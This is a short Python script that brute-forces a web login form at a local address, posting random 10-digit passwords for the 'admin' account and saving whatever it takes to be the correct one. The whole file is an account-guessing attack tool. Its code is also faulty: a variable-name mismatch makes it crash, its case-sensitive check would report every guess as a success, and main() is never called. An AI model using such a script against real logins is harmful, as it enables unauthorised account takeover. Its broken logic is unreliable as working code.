import requests
import random
from threading import Thread

url="http://127.0.0.1:8000/kaya/login/account/"
username = 'admin'
def send_request(username, password):
    data = {
        "username": username,
        "password": password
    }

    r = requests.post(url, data=data)
    return r

chars = "0123456789"
def main():
    while True:
        Valid = False
        while not valid:
            rndpasswd = random.choices(chars, k=10)
            passwd = "".join(rndpasswd)
            file = open("tries.txt", 'r')
            tries = file.read()
            file.close()
            if passwd in tries:
                pass
            else:
                valid = True
        r = send_request(username,passwd)

        if 'Login Failed!' in r.text.lower():
            print(f"Incorrect {passwd}")
        else:
            print(f"You are logged in. Correct Password {passwd}!/\n")
            with open("correct_pass.txt", "w") as f:
                f.write(passwd)

